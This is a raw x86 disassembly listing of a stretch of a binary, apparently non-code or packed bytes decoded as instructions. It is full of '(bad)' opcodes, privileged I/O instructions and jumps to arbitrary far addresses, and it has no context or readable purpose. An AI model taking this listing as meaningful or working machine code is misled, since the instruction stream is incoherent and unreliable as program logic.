  407fb3:	mov    ecx,0x1a92f9bd
  407fb8:	and    BYTE PTR [edx],ch
  407fba:	push   esp
  407fbb:	mov    ch,0x2a
  407fbd:	(bad)  
  407fbe:	jle    0x40802f
  407fc0:	pop    edx
  407fc1:	inc    edi
  407fc2:	into   
  407fc3:	mov    esp,0xf142a0f3
  407fc8:	sub    eax,0xe8ae6265
  407fcd:	sub    esp,DWORD PTR [eax+0x95ae8f2]
  407fd3:	jbe    0x40804f
  407fd5:	in     eax,0xdd
  407fd7:	rol    WORD PTR [esi],cl
  407fda:	adc    DWORD PTR [ebx-0x2cad2e71],esp
  407fe0:	lahf   
  407fe1:	xor    ebx,0x737a850c
  407fe7:	stos   BYTE PTR es:[edi],al
  407fe8:	loop   0x407fb8
  407fea:	dec    esp
  407feb:	sub    eax,0x8f884457
  407ff0:	xchg   DWORD PTR [ebp-0x6e3871c],eax
  407ff6:	test   BYTE PTR [ebx-0x6c60208d],ch
  407ffc:	scas   al,BYTE PTR es:[edi]
  407ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ffe:	xor    DWORD PTR [edx-0x16],0x81015329
  408005:	fnstenv [esp+esi*8]
  408008:	push   edi
  408009:	stos   BYTE PTR es:[edi],al
  40800a:	test   DWORD PTR ds:0xb46c44bc,edx
  408010:	lds    edx,FWORD PTR [eax+0x6c3a8377]
  408016:	gs je  0x407fdc
  408019:	and    ecx,ecx
  40801b:	pop    eax
  40801c:	dec    dx
  40801e:	push   edx
  40801f:	adc    edi,DWORD PTR [ebx-0x3f30ba17]
  408025:	xor    bh,BYTE PTR [ecx-0x1ff47bec]
  40802b:	loopne 0x407fb1
  40802d:	outs   dx,DWORD PTR ds:[esi]
  40802e:	sar    DWORD PTR [esi-0x62643d9c],0xff
  408035:	inc    ecx
  408036:	sbb    BYTE PTR [edi],al
  408038:	retf   
  408039:	xchg   esp,eax
  40803a:	loope  0x407fff
  40803c:	mov    eax,ds:0x26f24271
  408041:	add    DWORD PTR [ecx],ebx
  408043:	sbb    eax,0x4f57c459
  408048:	aas    
  408049:	sbb    eax,DWORD PTR [ebx-0x68]
  40804c:	iret   
  40804d:	sahf   
  40804e:	lds    esp,FWORD PTR [ecx+eax*1+0x13]
  408052:	sbb    BYTE PTR [edx-0x55ef6f92],dl
  408058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408059:	xchg   ecx,eax
  40805a:	fidiv  WORD PTR [esi-0x72]
  40805d:	mov    dh,0x25
  40805f:	mov    ebp,0x3a05908f
  408064:	(bad)  
  408066:	or     dl,BYTE PTR [edi-0x58179324]
  40806c:	adc    eax,0xe612cb9c
  408071:	repz loope 0x407ffb
  408074:	int3   
  408075:	inc    ebx
  408076:	xor    bh,BYTE PTR ss:0xa89885ac
  40807d:	jb     0x408063
  40807f:	cwde   
  408080:	adc    BYTE PTR [ebx+0x1a480bef],cl
  408086:	repnz push cs
  408088:	push   ebx
  408089:	push   0xb58ea348
  40808e:	movs   WORD PTR es:[edi],WORD PTR ss:[esi]
  408091:	adc    eax,0x19f129cc
  408096:	fmul   QWORD PTR [ecx+0x14f8a72c]
  40809c:	jno    0x408112
  40809e:	add    al,0x10
  4080a0:	push   esp
  4080a1:	shl    BYTE PTR [edx-0x52df9f69],1
  4080a7:	sub    al,0x9f
  4080a9:	jmp    0x62ea671c
  4080ae:	ins    DWORD PTR es:[edi],dx
  4080af:	and    DWORD PTR [ebx],edi
  4080b1:	ja     0x4080d4
  4080b3:	push   ebx
  4080b4:	adc    al,0x37
  4080b6:	ja     0x4080ed
  4080b8:	sub    DWORD PTR [ecx-0x1],ebp
  4080bb:	inc    ebx
  4080bc:	pop    esi
  4080bd:	adc    al,0x39
  4080bf:	stc    
  4080c0:	mov    esp,DWORD PTR [ebp+0x22cc592d]
  4080c6:	pop    edi
  4080c7:	push   ebx
  4080c8:	sub    bl,BYTE PTR [edx]
  4080ca:	mov    esp,0x7681a29
  4080cf:	or     DWORD PTR [eax+0x41e141c0],eax
  4080d5:	push   ebp
  4080d6:	fdivr  st(3),st
  4080d8:	lock adc ebx,DWORD PTR [edi+0x43]
  4080dc:	aaa    
  4080dd:	aaa    
  4080de:	push   0x83edfaca
  4080e3:	mov    eax,0x4a7f3fdb
  4080e8:	sub    al,0x94
  4080ea:	sub    edx,ebp
  4080ec:	cmp    DWORD PTR [ecx-0x1],ebp
  4080ef:	mov    BYTE PTR [eax+0x74],dl
  4080f2:	jns    0x408162
  4080f4:	mov    ah,BYTE PTR [esi]
  4080f6:	test   eax,0xe71e6681
  4080fb:	xlat   BYTE PTR ds:[ebx]
  4080fc:	es stc 
  4080fe:	xchg   DWORD PTR [esi-0x308a2a3e],esi
  408104:	idiv   DWORD PTR [eax+0x11]
  408107:	adc    al,bl
  408109:	mov    bl,0x55
  40810b:	in     al,0x37
  40810d:	outs   dx,DWORD PTR ds:[esi]
  40810e:	xor    edi,DWORD PTR [ebp-0x20e1a9e3]
  408114:	les    ebx,FWORD PTR [edi+0x73bef63b]
  40811a:	add    eax,0x53dc6428
  40811f:	fimul  DWORD PTR [edx+0x9d8f93e]
  408125:	call   0x2d0fc405
  40812a:	mov    ebp,0x11c0c38b
  40812f:	and    al,0xc2
  408131:	sub    DWORD PTR [ebx],eax
  408133:	retf   
  408134:	outs   dx,DWORD PTR ds:[esi]
  408135:	and    al,0xe1
  408137:	dec    ebp
  408138:	push   cs
  408139:	and    al,0xdf
  40813b:	jg     0x4081af
  40813d:	nop
  40813e:	push   eax
  40813f:	jle    0x408153
  408141:	aas    
  408142:	call   0xb9bd:0xfbbb81c2
  408149:	outs   dx,DWORD PTR ds:[esi]
  40814a:	ficom  WORD PTR [eax+eiz*4+0x1b90b07e]
  408151:	push   edi
  408152:	sahf   
  408153:	lea    esi,[eax+0x2f871dd7]
  408159:	push   edi
  40815a:	lds    eax,FWORD PTR [eax+0x76]
  40815d:	dec    ecx
  40815e:	sub    al,0x89
  408160:	jmp    0x4081bd
  408162:	mov    dl,0x68
  408164:	mov    ah,0xf4
  408166:	mov    eax,0x2eb32f29
  40816b:	push   ds
  40816c:	dec    ebx
  40816d:	fadd   DWORD PTR [ebx]
  40816f:	es push edx
  408171:	mov    edi,0x398a3a53
  408176:	ror    cl,1
  408178:	sub    edi,DWORD PTR [ebp-0x14bb9df2]
  40817e:	jmp    0xd9515bb9
  408183:	das    
  408184:	inc    ecx
  408185:	test   BYTE PTR [edi+0x2522641],0xfe
  40818c:	int    0x1c
  40818e:	scas   eax,DWORD PTR es:[edi]
  40818f:	pop    eax
  408190:	dec    esi
  408191:	mov    cl,0x9
  408193:	xlat   BYTE PTR ds:[ebx]
  408194:	cmp    BYTE PTR [edi+0x5a],bl
  408197:	dec    ecx
  408198:	add    DWORD PTR [ebx-0x45d6b920],edi
  40819e:	rcl    BYTE PTR [esi+ecx*1+0x50e9497c],0xfe
  4081a6:	mov    ebx,0xee92d9fd
  4081ab:	mov    ecx,0xe19370e9
  4081b0:	dec    ebp
  4081b1:	les    edi,FWORD PTR gs:[ebp-0x34]
  4081b5:	or     ecx,DWORD PTR [eax+0x3bb867cd]
  4081bb:	inc    esp
  4081bc:	ds jmp 0xbab1:0xb332dacb
  4081c4:	cli    
  4081c5:	nop
  4081c6:	scas   eax,DWORD PTR es:[edi]
  4081c7:	and    edi,DWORD PTR [eax-0x27da1295]
  4081cd:	out    dx,al
  4081ce:	loope  0x408226
  4081d0:	inc    edx
  4081d1:	ins    BYTE PTR es:[edi],dx
  4081d2:	mov    bl,0x1e
  4081d4:	or     ebx,DWORD PTR [edx]
  4081d6:	inc    edx
  4081d7:	aaa    
  4081d8:	cmp    cl,cl
  4081da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081db:	pop    edx
  4081dc:	sub    BYTE PTR [ecx],dh
  4081de:	mov    ecx,ss
  4081e0:	add    eax,0x6a449b16
  4081e5:	push   ebx
  4081e6:	xchg   ebx,eax
  4081e7:	std    
  4081e8:	and    dl,0xab
  4081eb:	data16 in al,dx
  4081ed:	daa    
  4081ee:	fs push ss
  4081f0:	(bad)  
  4081f1:	mov    cl,0x58
  4081f3:	in     al,0xbc
  4081f5:	cmp    al,0x85
  4081f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f8:	fld    TBYTE PTR [eax+0x3e]
  4081fb:	test   BYTE PTR [eax+0x7d],bh
  4081fe:	pop    ecx
  4081ff:	push   esp
  408200:	in     al,dx
  408201:	dec    edi
  408202:	inc    ebp
  408203:	data16 fcom QWORD PTR [eax-0x7ba9180c]
  40820a:	ins    DWORD PTR es:[edi],dx
  40820b:	int3   
  40820c:	stos   BYTE PTR es:[edi],al
  40820d:	and    eax,0xfcb2e5dd
  408212:	sub    BYTE PTR [eax+0x70],0x22
  408216:	sar    edi,cl
  408218:	inc    DWORD PTR [edx]
  40821a:	inc    ebp
  40821b:	ja     0x408224
  40821d:	loopne 0x4081c3
  40821f:	hlt    
  408220:	sub    ebx,ebp
  408222:	into   
  408223:	push   esp
  408224:	and    BYTE PTR [esi-0x681b8208],bh
  40822a:	ficom  DWORD PTR [ebp-0x68c6fc3c]
  408230:	mov    fs,WORD PTR [edi+0x659bb662]
  408236:	in     al,dx
  408237:	and    eax,0x4d342112
  40823c:	dec    esi
  40823d:	inc    ecx
  40823e:	and    ch,BYTE PTR [ecx-0x1c]
  408241:	inc    esp
  408242:	mov    edx,0xab03d4b6
  408247:	mov    eax,ds:0x6f2857d1
  40824c:	ss cdq 
  40824e:	xor    eax,0x3bb0dd4e
  408253:	int    0xba
  408255:	xor    eax,0x90aa36eb
  40825a:	or     cl,BYTE PTR [esi]
  40825c:	cwde   
  40825d:	test   DWORD PTR [esi+0x6],edi
  408260:	ins    BYTE PTR es:[edi],dx
  408261:	fnstcw WORD PTR [ecx+0x29]
  408264:	test   DWORD PTR [ebp+0x61],edi
  408267:	call   0xb00f:0xa26a7291
  40826e:	pushf  
  40826f:	not    DWORD PTR [ebp+0x41]
  408272:	dec    edx
  408273:	cli    
  408274:	push   0xcd20d336
  408279:	into   
  40827a:	mov    ecx,ds
  40827c:	mov    edi,0x46c24012
  408281:	jb     0x4082b5
  408283:	or     ecx,DWORD PTR [esi+0x4e1c6cd1]
  408289:	mov    esp,DWORD PTR [eax+ebx*2]
  40828c:	imul   ebx,DWORD PTR [ebp+0x73b98028],0x9577990b
  408296:	das    
  408297:	stos   DWORD PTR es:[edi],eax
  408298:	stc    
  408299:	or     eax,0x1d9855be
  40829e:	mov    DWORD PTR [esi-0x2c40a7a3],edx
  4082a4:	pop    ss
  4082a5:	pusha  
  4082a6:	adc    eax,0x2b49246c
  4082ab:	mov    bh,BYTE PTR [esi+edi*4-0x5833a53b]
  4082b2:	pop    es
  4082b3:	xchg   esi,eax
  4082b4:	outs   dx,DWORD PTR ds:[esi]
  4082b5:	mov    ch,0x90
  4082b7:	pop    edi
  4082b8:	xor    al,0x99
  4082ba:	repz in eax,0xbd
  4082bd:	pop    esp
  4082be:	in     eax,0xaa
  4082c0:	mov    ebp,0xd73a91e5
  4082c5:	aam    0x6
  4082c7:	adc    BYTE PTR [ecx],dl
  4082c9:	push   edi
  4082ca:	shr    BYTE PTR [edi],cl
  4082cc:	jg     0x408250
  4082ce:	push   ds
  4082cf:	cwde   
  4082d0:	ror    BYTE PTR [ebx],0x9f
  4082d3:	cli    
  4082d4:	not    ebx
  4082d6:	mov    esp,0x705f160e
  4082db:	jne    0x408271
  4082dd:	sub    esi,DWORD PTR [ebx+0x6d]
  4082e0:	lds    eax,FWORD PTR [ebx]
  4082e2:	inc    esp
  4082e3:	(bad)
  4082e7:	xor    eax,0xc424641c
  4082ec:	pusha  
  4082ed:	arpl   bp,si
  4082ef:	sti    
  4082f0:	inc    edi
  4082f1:	shl    BYTE PTR [ecx+0x27],1
  4082f4:	adc    ecx,DWORD PTR [edi-0xffcf931]
  4082fa:	outs   dx,BYTE PTR ds:[esi]
  4082fb:	stos   BYTE PTR es:[edi],al
  4082fc:	fimul  WORD PTR [eax]
  4082fe:	jecxz  0x408294
  408300:	ret    
  408301:	sti    
  408302:	(bad)
  408305:	push   cs
  408306:	or     eax,DWORD PTR [eax]
  408308:	pusha  
  408309:	push   cs
  40830a:	in     al,dx
  40830b:	(bad)  
  40830c:	xchg   ebx,eax
  40830d:	test   al,0xf
  40830f:	mov    ebx,ss
  408311:	sbb    eax,0xeb6d52f2
  408316:	int3   
  408317:	push   ecx
  408318:	xchg   edx,eax
  408319:	mov    ds:0xb5b1414c,eax
  40831e:	dec    eax
  40831f:	mov    edi,0x3cf70f56
  408324:	mov    edx,0x7131a760
  408329:	jmp    0x8959:0xbcbdcec0
  408330:	loop   0x408312
  408332:	pop    ebx
  408333:	sbb    BYTE PTR [ebx+0x3243928e],ch
  408339:	cdq    
  40833a:	dec    ebp
  40833b:	push   ds
  40833c:	mov    esp,0x287d7974
  408341:	mov    dl,0x39
  408343:	xchg   edx,eax
  408344:	neg    DWORD PTR [esi]
  408346:	push   edi
  408347:	add    dl,bl
  408349:	leave  
  40834a:	scas   al,BYTE PTR es:[edi]
  40834b:	lods   eax,DWORD PTR ds:[esi]
  40834c:	xor    cl,0xe5
  40834f:	cwde   
  408350:	int3   
  408351:	and    DWORD PTR [eax],ebx
  408353:	fldenv [edi-0x2d]
  408356:	pop    ss
  408357:	add    ch,BYTE PTR [eax+0x43]
  40835a:	(bad)  
  40835b:	sub    edi,eax
  40835d:	imul   ecx,edx,0x5aa379e7
  408363:	repnz cmp DWORD PTR gs:[edx-0x20],ecx
  408368:	inc    ecx
  408369:	shl    DWORD PTR ds:0xfd12bb09,cl
  40836f:	cmp    BYTE PTR [ecx-0x10],bl
  408372:	(bad)
  408375:	mov    edi,0x6fbc330a
  40837a:	adc    eax,0x799f6ed
  40837f:	shl    BYTE PTR [ecx-0x7],1
  408382:	dec    ebx
  408383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408385:	cmp    eax,0x155ef79e
  40838a:	in     al,dx
  40838b:	dec    ebp
  40838c:	mov    dl,0x53
  40838e:	ins    DWORD PTR es:[edi],dx
  40838f:	mov    ebp,0x885e639e
  408394:	int3   
  408395:	adc    ch,bl
  408397:	adc    al,0xea
  408399:	sub    DWORD PTR [edx],0xffffffeb
  40839c:	lahf   
  40839d:	pop    esi
  40839e:	std    
  40839f:	cdq    
  4083a0:	jbe    0x40839b
  4083a2:	mov    DWORD PTR [ebp+0xf172129],0x7ff3e141
  4083ac:	pop    ebp
  4083ad:	fsubr  QWORD PTR [esi*1-0x2e030664]
  4083b4:	sbb    ecx,ebx
  4083b6:	jmp    0xa32b:0xc5341c6a
  4083bd:	and    al,0x53
  4083bf:	sahf   
  4083c0:	xlat   BYTE PTR ds:[ebx]
  4083c1:	and    cl,BYTE PTR [eax]
  4083c3:	loopne 0x408438
  4083c5:	mov    dl,0xf1
  4083c7:	xor    ch,al
  4083c9:	js     0x4083fb
  4083cb:	leave  
  4083cc:	sbb    BYTE PTR [ebx+0x7e],dh
  4083cf:	inc    edx
  4083d0:	dec    edx
  4083d1:	fcomp  DWORD PTR [ebp-0x23]
  4083d4:	rol    BYTE PTR [edi+0x65e100a5],0xf1
  4083db:	mov    ?,WORD PTR [eax+0x23]
  4083de:	outs   dx,BYTE PTR ds:[esi]
  4083df:	or     esi,esp
  4083e1:	in     al,0x56
  4083e3:	cmp    al,0x3d
  4083e5:	cmp    edx,esi
  4083e7:	jl     0x4083aa
  4083e9:	pop    edi
  4083ea:	xchg   DWORD PTR [edi],edi
  4083ec:	(bad)  [ebp-0x73]
  4083ef:	and    eax,0x521cfa1f
  4083f4:	adc    ebx,DWORD PTR [ebp+edi*2+0x3]
  4083f8:	fwait
  4083f9:	inc    edx
  4083fa:	add    ecx,DWORD PTR [eax]
  4083fc:	inc    edi
  4083fd:	lea    edi,[edx+0x1]
  408400:	ret    
  408401:	lds    ebx,FWORD PTR [eax+0x7e]
  408404:	pop    ecx
  408405:	push   cs
  408406:	fnstsw WORD PTR [edi]
  408408:	fs push esi
  40840a:	test   eax,0x1355bf95
  40840f:	lods   al,BYTE PTR ds:[esi]
  408410:	jns    0x4083f2
  408412:	lahf   
  408413:	test   eax,0xfb50cfbf
  408418:	outs   dx,DWORD PTR ds:[esi]
  408419:	bnd jbe 0x40847d
  40841c:	test   eax,0x5e7d0d73
  408421:	and    eax,0xfb015b03
  408426:	out    dx,eax
  408427:	imul   ebx,DWORD PTR [edi-0x70],0x41
  40842b:	jmp    0x6120:0xa384102b
  408432:	scas   eax,DWORD PTR es:[edi]
  408433:	inc    ecx
  408434:	sbb    BYTE PTR [ecx-0x76],ah
  408437:	xor    eax,0xeb3b6a1
  40843c:	je     0x408468
  40843e:	ins    DWORD PTR es:[edi],dx
  40843f:	imul   edx,DWORD PTR [ebp-0x37158917],0x2b520597
  408449:	mov    dh,0x84
  40844b:	push   es
  40844c:	in     al,0xf7
  40844e:	mov    ah,0xa4
  408450:	adc    esp,esp
  408452:	jg     0x40848c
  408454:	push   esp
  408455:	invd   
  408457:	imul   ecx,DWORD PTR [ecx+0x50],0x47
  40845b:	and    bl,al
  40845d:	retf   0xeb44
  408460:	xor    eax,0xa444df0d
  408465:	mov    al,0xd9
  408467:	xchg   ebx,eax
  408468:	shr    BYTE PTR [edx-0x21],cl
  40846b:	xchg   ebp,eax
  40846c:	pop    ebp
  40846d:	xor    eax,0x99a82fb7
  408472:	pop    esi
  408473:	inc    ebx
  408474:	rol    BYTE PTR [edi-0x62],cl
  408477:	or     al,0x5d
  408479:	inc    esp
  40847a:	mov    bh,BYTE PTR es:[ebx+0x2e]
  40847e:	sbb    BYTE PTR [edi+edx*1+0x3c],ah
  408482:	adc    cl,BYTE PTR [edi-0x1e768878]
  408488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408489:	icebp  
  40848a:	push   esp
  40848b:	out    0x72,eax
  40848d:	icebp  
  40848e:	inc    esi
  40848f:	dec    edi
  408490:	xor    eax,0xb8e846e6
  408495:	inc    esp
  408496:	pop    esi
  408497:	ficom  DWORD PTR [ecx-0xd]
  40849a:	div    DWORD PTR [ebx+0x20cf4dee]
  4084a0:	imul   eax,DWORD PTR [edx],0x67
  4084a3:	mov    dh,0x55
  4084a5:	iret   
  4084a6:	shl    esi,cl
  4084a8:	(bad)  
  4084a9:	push   esi
  4084aa:	mov    edi,edi
  4084ac:	dec    DWORD PTR [esi-0x28f64a94]
  4084b2:	aad    0xa5
  4084b4:	mov    es,ecx
  4084b6:	inc    edx
  4084b7:	jae    0x408494
  4084b9:	inc    edx
  4084ba:	popf   
  4084bb:	xlat   BYTE PTR ds:[ebx]
  4084bc:	imul   esi,ebx,0xa3c98111
  4084c2:	ss fs repnz repz arpl dx,bx
  4084c8:	jg     0x4084d6
  4084ca:	push   esp
  4084cb:	out    dx,eax
  4084cc:	fs (bad) 
  4084ce:	loopne 0x4084d3
  4084d0:	mov    ah,0x4f
  4084d2:	sub    DWORD PTR [esi-0x11d879f1],ebp
  4084d8:	fstp   QWORD PTR [edi-0x346ba8aa]
  4084de:	in     al,0x65
  4084e0:	jge    0x408474
  4084e2:	(bad)  
  4084e3:	out    0xcf,al
  4084e5:	xor    BYTE PTR [ecx-0x4b1e5220],0xf3
  4084ec:	imul   DWORD PTR [edi+eiz*4-0x7f]
  4084f0:	dec    eax
  4084f1:	(bad)  
  4084f2:	bound  esi,QWORD PTR [edx]
  4084f4:	inc    ebp
  4084f5:	inc    ebx
  4084f6:	rcr    cl,0x55
  4084f9:	xor    BYTE PTR [eax-0x3d],0x2c
  4084fd:	ins    DWORD PTR es:[edi],dx
  4084fe:	int3   
  4084ff:	xor    DWORD PTR [ebx],edi
  408501:	enter  0x8c07,0x17
  408505:	sbb    al,0x52
  408507:	xor    DWORD PTR [edi+0x61621595],esp
  40850d:	(bad)  
  40850e:	leave  
  40850f:	test   eax,0xf424ad8d
  408514:	xor    ebx,DWORD PTR [eax+0x6ff0c1fc]
  40851a:	pop    ecx
  40851b:	rol    BYTE PTR [eax+0x22e65106],0xe2
  408522:	ja     0x4084f9
  408524:	into   
  408525:	sub    eax,0xffe121cd
  40852a:	xor    BYTE PTR [edx+0x77],0xb0
  40852e:	pop    eax
  40852f:	jge    0x40856e
  408531:	(bad)  
  408532:	lods   eax,DWORD PTR ds:[esi]
  408533:	jmp    FWORD PTR [ebx]
  408535:	mov    dl,0xf6
  408537:	xor    cl,BYTE PTR ss:[edx+0x3d]
  40853b:	and    al,0x8c
  40853d:	cs call 0x287:0x750d
  408544:	clc    
  408545:	retf   
  408546:	ds int 0x7c
  408549:	popa   
  40854a:	and    DWORD PTR [ebp+0x78d8b3b2],0x6bff9187
  408554:	dec    eax
  408555:	and    BYTE PTR [edi+0x30df8a32],cl
  40855b:	std    
  40855c:	inc    esp
  40855d:	fwait
  40855e:	jne    0x40856f
  408560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408561:	enter  0x2358,0x0
  408565:	sti    
  408566:	in     al,dx
  408567:	jne    0x4084fb
  408569:	xchg   edi,eax
  40856a:	loope  0x4085e1
  40856c:	fild   QWORD PTR [edx]
  40856e:	push   0xd16dc8ec
  408573:	imul   esi,DWORD PTR [ecx],0xfffffff0
  408576:	out    0xac,eax
  408578:	mov    ah,0x28
  40857a:	idiv   BYTE PTR [edx-0x39]
  40857d:	xor    DWORD PTR [edx+0xd],edi
  408580:	jae    0x408506
  408582:	stos   DWORD PTR es:[edi],eax
  408583:	popf   
  408584:	ins    DWORD PTR es:[edi],dx
  408585:	mov    dh,bl
  408587:	outs   dx,BYTE PTR ds:[esi]
  408588:	add    eax,0x599595ba
  40858d:	lods   al,BYTE PTR ds:[esi]
  40858e:	dec    esp
  40858f:	add    cl,ah
  408591:	iret   
  408592:	inc    ebp
  408593:	or     ch,BYTE PTR [ebx+ebx*8+0x4a918093]
  40859a:	and    eax,0xf530365c
  40859f:	stos   DWORD PTR es:[edi],eax
  4085a0:	imul   edx,DWORD PTR [edi-0x47],0xfb7cd123
  4085a7:	sbb    dh,dl
  4085a9:	mov    edi,0xb2dcd2d4
  4085ae:	jg     0x408613
  4085b0:	stc    
  4085b1:	ins    DWORD PTR es:[edi],dx
  4085b2:	add    edx,DWORD PTR [ecx+0x7]
  4085b5:	or     edi,DWORD PTR [edi+esi*8]
  4085b8:	pop    edx
  4085b9:	mov    es,ecx
  4085bb:	sub    al,BYTE PTR [edi-0x7e]
  4085be:	sbb    DWORD PTR [ecx+0x48],edi
  4085c1:	or     al,0xbb
  4085c3:	or     BYTE PTR [ebx+0x3babc452],al
  4085c9:	mov    edx,0x231de6c6
  4085ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085cf:	push   es
  4085d0:	push   0xffffffa5
  4085d2:	ins    BYTE PTR es:[edi],dx
  4085d3:	mov    eax,0x9667c4e6
  4085d8:	mov    ebx,0xe913bd3e
  4085dd:	out    0x2e,eax
  4085df:	or     BYTE PTR [edi],cl
  4085e1:	jae    0x4085df
  4085e3:	(bad)  
  4085e4:	sti    
  4085e5:	cmp    DWORD PTR [edi+0x5f],edx
  4085e8:	in     eax,dx
  4085e9:	ret    
  4085ea:	fadd   DWORD PTR [esi+0x573c14fc]
  4085f0:	(bad)  
  4085f1:	stc    
  4085f2:	ins    DWORD PTR es:[edi],dx
  4085f3:	dec    ebx
  4085f4:	xor    BYTE PTR ds:0xb53194b0,cl
  4085fa:	pop    esi
  4085fb:	and    DWORD PTR [ebx-0x4e],esp
  4085fe:	push   ss
  4085ff:	retf   
  408600:	push   edx
  408601:	addr16 (bad) 
  408603:	jecxz  0x408620
  408605:	push   ebx
  408606:	cwde   
  408607:	loop   0x40863b
  408609:	mov    dh,0x2
  40860b:	pop    ss
  40860c:	popa   
  40860d:	mov    ch,0xb5
  40860f:	sbb    esi,ebx
  408611:	ficom  WORD PTR [esi+ebx*2+0x12]
  408615:	mov    bh,0x16
  408617:	retf   
  408618:	sub    esi,DWORD PTR [ebx]
  40861a:	and    BYTE PTR [esi-0x293dc197],bh
  408620:	test   ah,dh
  408622:	mov    ah,0x6b
  408624:	popf   
  408625:	fdivr  DWORD PTR [ebp+0x7d1eba0c]
  40862b:	nop
  40862c:	push   es
  40862d:	jns    0x40867b
  40862f:	push   cs
  408630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408631:	push   0x7b9ae15b
  408636:	xchg   ecx,eax
  408637:	jg     0x408687
  408639:	je     0x408611
  40863b:	rcl    DWORD PTR [edi],0x4f
  40863e:	imul   ebp,DWORD PTR [edx-0x30],0x6a
  408642:	jecxz  0x40869e
  408644:	inc    eax
  408645:	and    eax,0x9ad78dbe
  40864a:	jb     0x40862e
  40864c:	(bad)  
  40864d:	scas   eax,DWORD PTR es:[edi]
  40864e:	lods   al,BYTE PTR ds:[esi]
  40864f:	adc    eax,0xae732e26
  408654:	retf   0x51b9
  408657:	add    eax,0x50354e77
  40865c:	jle    0x408624
  40865e:	jno    0x40866f
  408660:	xchg   esi,eax
  408661:	lods   eax,DWORD PTR ds:[esi]
  408662:	leave  
  408663:	adc    al,cl
  408665:	arpl   bp,bp
  408667:	sub    cl,BYTE PTR [ecx+0x6a7c123f]
  40866d:	imul   ecx,DWORD PTR [eax+0x30],0x6949ab2e
  408674:	xchg   ebp,esi
  408676:	call   DWORD PTR ds:0x2eb3a688
  40867c:	xor    BYTE PTR [edi*4-0x6a0696a1],dh
  408683:	push   esi
  408684:	jb     0x40863b
  408686:	jae    0x408636
  408688:	ss or  dh,ch
  40868b:	sub    al,0xdc
  40868d:	push   0x3f
  40868f:	cmp    al,0xcb
  408691:	push   cs
  408692:	lods   eax,DWORD PTR ds:[esi]
  408693:	sbb    ch,BYTE PTR [edx+0x55]
  408696:	sbb    al,0x28
  408698:	cld    
  408699:	gs addr16 rcr ebp,0xb5
  40869e:	jbe    0x408711
  4086a0:	retf   
  4086a1:	mov    DWORD PTR [esi],edi
  4086a3:	ret    0xbd1c
  4086a6:	xchg   esp,eax
  4086a7:	outs   dx,DWORD PTR gs:[esi]
  4086a9:	xchg   DWORD PTR [edi],esp
  4086ab:	xor    BYTE PTR [edi],dh
  4086ad:	retf   0xd6d3
  4086b0:	sbb    esp,DWORD PTR [edx]
  4086b2:	shl    esi,cl
  4086b4:	and    al,0x54
  4086b6:	sub    al,0xe
  4086b8:	cmp    BYTE PTR [eax],ah
  4086ba:	sbb    ecx,esp
  4086bc:	cwde   
  4086bd:	fs add edi,eax
  4086c0:	(bad)  
  4086c2:	(bad)  
  4086c3:	out    dx,al
  4086c4:	pop    edi
  4086c5:	lods   al,BYTE PTR es:[esi]
  4086c7:	call   0x3063a52f
  4086cc:	or     eax,0xac26590b
  4086d1:	cmp    bh,ch
  4086d3:	cmp    eax,0xaec7a4ce
  4086d8:	sub    al,0xb1
  4086da:	xchg   edi,eax
  4086db:	lods   eax,DWORD PTR ds:[esi]
  4086dc:	push   edx
  4086dd:	mov    dh,0xdf
  4086df:	out    dx,al
  4086e0:	es (bad) 
  4086e2:	xlat   BYTE PTR ds:[ebx]
  4086e3:	out    0x34,al
  4086e5:	and    al,0xb
  4086e7:	push   ss
  4086e8:	into   
  4086e9:	ss dec ecx
  4086eb:	es inc edx
  4086ed:	lock scas al,BYTE PTR es:[edi]
  4086ef:	jmp    0x9edc:0xeaa2c79
  4086f6:	mov    BYTE PTR [edi-0x20],dh
  4086f9:	sbb    BYTE PTR [ebp+ebx*8-0x7a],bl
  4086fd:	cmp    dl,BYTE PTR [ebx]
  4086ff:	nop
  408700:	mov    ds,WORD PTR [ebp-0x535b79ba]
  408706:	cmp    dl,cl
  408708:	xchg   ecx,eax
  408709:	mov    ebx,0x56be77f6
  40870e:	repz xor al,0xcc
  408711:	sub    DWORD PTR [edx+0x4169cdf0],ebx
  408717:	in     al,dx
  408718:	fdivrp st(2),st
  40871a:	cli    
  40871b:	push   ds
  40871c:	mov    ebp,0x3509ad00
  408721:	mov    ebx,0xcfeeeaca
  408726:	aam    0x3e
  408728:	push   eax
  408729:	iret   
  40872a:	jae    0x4086e9
  40872c:	mov    bh,0x3c
  40872e:	and    DWORD PTR [ebx],esp
  408730:	or     eax,0x7228e728
  408735:	loopne 0x40876d
  408737:	xchg   edx,eax
  408738:	lds    ebp,FWORD PTR [esi-0x67]
  40873b:	mov    eax,eax
  40873d:	fadd   st(7),st
  40873f:	xor    bh,BYTE PTR [esi+0x3b]
  408742:	in     eax,0xe9
  408744:	nop
  408745:	arpl   WORD PTR [edi-0x80],ax
  408748:	dec    ebx
  408749:	daa    
  40874a:	jb     0x408730
  40874c:	aam    0x7d
  40874e:	dec    ebx
  40874f:	(bad)  
  408750:	mov    al,0x42
  408752:	jmp    0xf68e1129
  408757:	lds    esi,FWORD PTR [edi-0x77]
  40875a:	inc    ebp
  40875b:	xchg   esp,eax
  40875c:	dec    esi
  40875d:	retf   0x903a
  408760:	aad    0x5
  408762:	mov    al,ds:0x4f488c18
  408767:	cmp    eax,0xde2eaced
  40876c:	sub    al,BYTE PTR [ecx-0x5fe9ad7]
  408772:	gs and eax,eax
  408775:	loop   0x40871e
  408777:	loope  0x40872e
  408779:	popf   
  40877a:	push   0x42b3523
  40877f:	clc    
  408780:	jl     0x4087f9
  408782:	inc    esp
  408783:	stos   DWORD PTR es:[edi],eax
  408784:	push   esp
  408785:	fld    QWORD PTR [edx-0x16]
  408788:	add    DWORD PTR [ebp-0x2e],eax
  40878b:	in     eax,0xab
  40878d:	aas    
  40878e:	(bad)  
  40878f:	aam    0xd5
  408791:	jo     0x4087d2
  408793:	xor    bh,BYTE PTR [ebp-0x6b]
